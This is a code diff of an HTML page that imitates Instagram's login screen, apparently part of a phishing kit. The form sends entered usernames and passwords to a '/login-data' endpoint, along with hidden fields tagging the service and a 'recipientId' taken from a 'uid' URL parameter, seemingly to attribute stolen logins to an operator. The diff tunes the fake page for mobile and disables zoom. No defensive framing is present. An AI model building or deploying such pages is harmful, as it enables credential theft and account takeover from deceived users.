@@ -2,34 +2,33 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Login • Instagram</title>
     <style>
-        body { margin: 0; background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .container { max-width: 350px; width: 100%; }
-        .box { background: #fff; border: 1px solid #dbdbdb; padding: 10px 40px 20px; border-radius: 3px; text-align: center; }
-        .logo { width: 175px; margin: 22px auto 12px; }
-        input { width: 100%; padding: 9px; margin: 4px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
-        button { width: 100%; padding: 8px; margin-top: 14px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; }
+        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; padding: 0 40px; box-sizing: border-box; }
+        .logo { font-family: 'Billabong', 'Grand Hotel', cursive; font-size: 50px; text-align: center; margin-bottom: 30px; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        input:focus { border-color: #a8a8a8; }
+        button { width: 100%; padding: 12px; background: #3897f0; border: none; border-radius: 6px; color: #fff; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        button:disabled { opacity: 0.5; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="box">
-            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram">
-            <form action="/login-data" method="post">
-                <input type="text" name="username" placeholder="Phone number, username, or email" required>
-                <input type="password" name="password" placeholder="Password" required>
-                <!-- HIDDEN FIELDS -->
-                <input type="hidden" name="service" value="Instagram">
-                <input type="hidden" id="recipientId" name="recipientId" value="">
-                <button type="submit">Log In</button>
-            </form>
-        </div>
+        <div class="logo">Instagram</div>
+        <form action="/login-data" method="post" style="width: 100%;">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required autocapitalize="none">
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="hidden" name="service" value="Instagram">
+            <input type="hidden" id="recipientId" name="recipientId" value="">
+            <button type="submit">Log In</button>
+        </form>
     </div>
     <script>
         document.addEventListener("DOMContentLoaded", () => {
-            const userId = new URLSearchParams(window.location.search).get('uid');
+            const params = new URLSearchParams(window.location.search);
+            const userId = params.get('uid');
             if (userId) document.getElementById('recipientId').value = userId;
         });
     </script>
